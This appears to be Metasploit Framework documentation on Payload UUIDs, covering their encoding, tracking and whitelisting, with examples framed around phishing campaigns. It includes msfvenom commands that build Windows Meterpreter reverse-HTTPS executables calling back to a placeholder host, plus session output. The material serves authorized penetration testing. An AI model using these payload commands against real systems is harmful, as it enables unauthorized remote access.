
In mid-2015, a new feature was added to many HTTP and TCP Metasploit payloads: Payload UUIDs. A Payload UUID is a 16-byte value that encodes an 8-byte identifier, a 1-byte architecture ID, a 1-byte platform ID, a 4-byte timestamp, and two additional bytes for obfuscation. The [source code comments](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/uuid.rb) go into more detail.

In the case of HTTP payloads, the 16-byte UUID value is encoded in [base64url](https://tools.ietf.org/html/rfc4648#section-5) format resulting in a 22-byte string. This value is always placed in the beginning of the URL used by the payload. TCP payloads send the 16-byte raw value over the socket once a connection is established.

The goal of Payload UUIDs is three-fold:
 * Uniquely identify a generated payload. This is important when running social engineering campaigns to identify what specific payload a target executed. If an email campaign resulted in one user forwarding a payload to another user before it was executed, this can be determined by reviewing the UUID in the session listing.
 * Drop connections that do not match known UUIDs. This allows a listener to be setup that only allows known sessions to connect, which is important when running internet-facing payload handlers.
 * Enable universal handlers. The embedded platform and architecture identifiers allow the listener to determine what type of stage to send back to a stager. This will eventually allow for a single listener to be used with multiple exploits, even those that target different platforms and architectures.

### Specifying the UUID

Although Payload UUIDs are normally random, it is possible to specify a static UUID value using the ```PayloadUUIDRaw``` option. This option takes a 8-byte hex string, such as "0011223344556677". For example:
```
$ ./msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDRaw=4444444444444444 -f exe -o payload.exe
```

Instead of specifying a static UUID as the raw 8-byte value, it is also possible to derive a static UUID using an arbitrary-length string using the PayloadUUIDSeed option:
```
$ ./msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDSeed=ShellsAreDelicious -f exe -o payload.exe
```

### Tracking the UUID

Payload UUIDs are enabled by default, but are not tracked unless the ```PayloadUUIDTracking``` option is set to ```true```. Setting this option causes a new entry to be created in ```~/.msf4/payloads.json``` when any UUID-enabled payload is generated. It is also possible to create a local-only name for a given UUID using the ```PayloadUUIDName```. The example below will create a new registered payload with a custom name:

```
$ ./msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDTracking=true PayloadUUIDName=EmailCampaign20150101 -f exe -o payload.exe

$ cat ~/.msf4/payloads.json
{
  "68017d72958c40f6": {
    "arch": "x86",
    "platform": "windows",
    "timestamp": 1435277049,
    "payload": "payload/windows/meterpreter/reverse_https",
    "datastore": {"AutoLoadStdapi":true,"AutoRunScript":"","AutoSystemInfo":true,"AutoVerifySession":true,"AutoVerifySessionTimeout":30,"EXITFUNC":"process","EnableStageEncoding":false,"EnableUnicodeEncoding":false,"HttpUnknownRequestResponse":"\u003Chtml\u003E\u003Cbody\u003E\u003Ch1\u003EIt works!\u003C/h1\u003E\u003C/body\u003E\u003C/html\u003E","IgnoreUnknownPayloads":false,"InitialAutoRunScript":"","LHOST":"127.1.1.1","LPORT":4444,"MeterpreterServerName":"Apache","MeterpreterUserAgent":"Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)","OverrideRequestHost":false,"PAYLOADUUIDNAME":"EmailCampaign20150101","PayloadProxyPort":0,"PayloadProxyType":"HTTP","PayloadUUIDTracking":true,"PrependMigrate":false,"ReverseListenerBindPort":0,"SessionCommunicationTimeout":300,"SessionExpirationTimeout":604800,"SessionRetryTotal":3600,"SessionRetryWait":10,"StageEncoderSaveRegisters":"","StageEncodingFallback":true,"StagerRetryCount":10,"StagerURILength":0,"StagerVerifySSLCert":false,"VERBOSE":false},
    "name": "EmailCampaign20150101",
    "urls": [
  "/aAF9cpWMQPb-3f_cq1FoJA040uMw26kAnvroJdztpVzDrNpqbpT7t3DyYy0cR2TyQE87XxHgIOKiYwP2FJNlNjrBXWQNiGWtzUK1ueJ0DyFjCXmULVo_gGrvi"
]
}
}
```

Once this payload is launched, the output of the ```sessions -l -v``` command will show the UUID, whether or not the UUID is registered, and any locally-assigned name of the UUID:
```msf
msf exploit(handler) > run -j
[*] 127.0.0.1:36235 (UUID: 68017d72958c40f6/x86=1/windows=1/2015-06-26T00:04:09Z) Staging Native payload ...
[*] Meterpreter session 1 opened (127.1.1.1:4444 -> 127.0.0.1:36235) at 2015-06-25 17:12:40 -0700

msf exploit(handler) > sessions  -l -v

Active sessions
===============

  Session ID: 1
        Type: meterpreter x86/win32
        Info: fang\hdm @ fang
      Tunnel: 127.1.1.1:4444 -> 127.0.0.1:36235 (127.0.0.1)
         Via: exploit/multi/handler
        UUID: 68017d72958c40f6/x86=1/windows=1/2015-06-26T00:04:09Z
   MachineID: 1fd541d2c4278e2d0c1b02f17f142f2b
     CheckIn: 1s ago @ 2015-06-25 17:12:47 -0700
  Registered: Yes - Name="EmailCampaign20150101"
  ```

### Whitelisting UUIDs

The ```~/.msf4/payloads.json``` file can also be used as a whitelist. This makes it possible to run a listener on a common port on a public IP address without the Metasploit Framework instance being flooded with bogus sessions. To enable whitelisting for HTTP payloads, set the ```IgnoreUnknownPayloads``` option to ```true``` in the handler instance. Any incoming request that does match both a registered Payload UUID and one of the pre-generated URLs will be ignored. The ```payloads.json``` file can be copied between Metasploit Framework instances and even hand-edited while the framework is running.

